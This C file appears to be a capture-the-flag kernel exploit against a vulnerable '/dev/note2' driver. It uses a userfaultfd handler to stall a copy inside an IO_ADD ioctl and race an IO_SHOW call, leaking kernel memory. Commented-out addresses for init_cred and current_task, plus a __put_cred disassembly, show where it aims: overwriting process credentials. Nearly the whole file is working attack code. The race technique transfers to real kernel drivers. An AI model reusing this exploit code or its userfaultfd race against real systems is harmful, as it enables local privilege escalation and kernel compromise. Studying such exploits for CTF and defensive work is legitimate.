#define _GNU_SOURCE

#include <assert.h>
#include <errno.h>
#include <fcntl.h>
#include <linux/userfaultfd.h>
#include <poll.h>
#include <pthread.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <syscall.h>
#include <unistd.h>

#define IO_ADD 0xFFFFFF00
#define IO_EDIT 0xFFFFFF01
#define IO_SHOW 0xFFFFFF02
#define IO_DEL 0xFFFFFF03

struct ioctl_arg {
  uint64_t idx;
  uint64_t size;
  uint64_t addr;
};

struct node {
  uint64_t key;
  uint64_t size;
  uint64_t addr;
};

#define PAGE_SIZE 4096
// static const unsigned long current_task = 0x1BBC0UL;
// static const unsigned long abs_kernel = 0xFFFFFFFF81000000UL;
// static const unsigned long abs_single_start = 0xFFFFFFFF813015F0UL;
// static const unsigned long abs_pcpu_base_addr = 0xFFFFFFFF821901D8UL;
// static const unsigned long abs_init_cred = 0xFFFFFFFF82654220UL;
#define SIZEOF_SEQ_OPERATIONS 32

/*
void __put_cred(struct cred *cred)
{
FFFFFFFF810B9000 T__put_cred
ffffffff810b9000:       e8 fb de fa ff          call   0xffffffff81066f00
        BUG_ON(atomic_read(&cred->usage) != 0);
ffffffff810b9005:       8b 07                   mov    (%rdi),%eax
ffffffff810b9007:       85 c0                   test   %eax,%eax
ffffffff810b9009:       75 43                   jne    0xffffffff810b904e
        BUG_ON(cred == current->cred);
ffffffff810b900b:       65 48 8b 04 25 c0 bb    mov    %gs:0x1bbc0,%rax
ffffffff810b9012:       01 00
ffffffff810b9014:       48 3b b8 78 0a 00 00    cmp    0xa78(%rax),%rdi
*/
#define OFFSETOF_TASK_CRED 0xa78

#define NOTE2_PATH "/dev/note2"

struct fault_handler {
  const char *desc;
  pthread_t thread;
  void *page;
  int uffd;
  char value[PAGE_SIZE];
  void (*callback)(void *);
  void *arg;
};

static void *fault_handler_thread(void *arg) {
  struct fault_handler *fh = arg;

  struct pollfd pollfd;
  pollfd.fd = fh->uffd;
  pollfd.events = POLLIN;
  int nready = poll(&pollfd, 1, -1);
  printf("[*] poll({%s, POLLIN}) = %d\n", fh->desc, nready);
  assert(nready >= 0);

  struct uffd_msg msg;
  ssize_t nread = read(fh->uffd, &msg, sizeof(msg));
  printf("[*] read(%s) = %zd\n", fh->desc, nread);
  assert(nread == sizeof(msg));
  assert(msg.event == UFFD_EVENT_PAGEFAULT);
  assert(msg.arg.pagefault.address == (__u64)fh->page);

  fh->callback(fh->arg);

  struct uffdio_copy uffdio_copy;
  uffdio_copy.src = (__u64)fh->value;
  uffdio_copy.dst = (__u64)fh->page;
  uffdio_copy.len = PAGE_SIZE;
  uffdio_copy.mode = 0;
  uffdio_copy.copy = 0;
  int ret = ioctl(fh->uffd, (int)UFFDIO_COPY, &uffdio_copy);
  printf("[*] ioctl(%s, UFFDIO_COPY) = %d\n", fh->desc, ret);
  assert(ret == 0);

  return NULL;
}

static void fault_handler_init(struct fault_handler *fh, const char *desc,
                               unsigned long value, void (*callback)(void *),
                               void *arg) {
  fh->desc = desc;
  *(unsigned long *)fh->value = value;
  fh->callback = callback;
  fh->arg = arg;

  fh->page = mmap(NULL, PAGE_SIZE, PROT_READ | PROT_WRITE,
                  MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
  printf("[*] %s->page = %p\n", fh->desc, fh->page);
  assert(fh->page != MAP_FAILED);

  fh->uffd = syscall(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK);
  printf("[*] %s->uffd = %d\n", fh->desc, fh->uffd);
  assert(fh->uffd != -1);

  struct uffdio_api uffdio_api;
  uffdio_api.api = UFFD_API;
  uffdio_api.features = 0;
  int ret = ioctl(fh->uffd, (int)UFFDIO_API, &uffdio_api);
  printf("[*] ioctl(%s, UFFDIO_API) = %d\n", fh->desc, ret);
  assert(ret == 0);

  struct uffdio_register uffdio_register;
  uffdio_register.range.start = (unsigned long)fh->page;
  uffdio_register.range.len = PAGE_SIZE;
  uffdio_register.mode = UFFDIO_REGISTER_MODE_MISSING;
  ret = ioctl(fh->uffd, (int)UFFDIO_REGISTER, &uffdio_register);
  printf("[*] ioctl(%s, UFFDIO_REGISTER) = %d\n", fh->desc, ret);
  assert(ret == 0);

  ret = pthread_create(&fh->thread, NULL, fault_handler_thread, fh);
  printf("[*] pthread_create(%s) = %d\n", fh->desc, ret);
  assert(ret == 0);
}

static void fault_handler_destroy(struct fault_handler *fh) {
  void *retval;
  pthread_join(fh->thread, &retval);
  close(fh->uffd);
  munmap(fh->page, PAGE_SIZE);
}

static void on_add(void *arg) {
  int note2_fd = (int)(long)arg;
  char show_buf[sizeof(struct node)];
  struct ioctl_arg show = {
      .idx = 0, .size = sizeof(show_buf), .addr = (uint64_t)&show_buf};
  int err = ioctl(note2_fd, IO_SHOW, &show);
  assert(err == 0);
}

int main() {
  int note2_fd = open(NOTE2_PATH, O_RDWR);
  printf("[*] note2_fd = %d\n", note2_fd);
  assert(note2_fd != -1);

  for (int i = 0; i < 0x10; i++) {
    struct ioctl_arg del = {.idx = i, .size = 0, .addr = 0};
    ioctl(note2_fd, IO_DEL, &del);
  }

  struct fault_handler add_fh;
  fault_handler_init(&add_fh, "IO_ADD", 42, on_add, (void *)(long)note2_fd);
  struct ioctl_arg add = {
      .idx = 0, .size = sizeof(struct node), .addr = (uint64_t)add_fh.page};
  int err = ioctl(note2_fd, IO_ADD, &add);
  assert(err == 0);
  fault_handler_destroy(&add_fh);
}
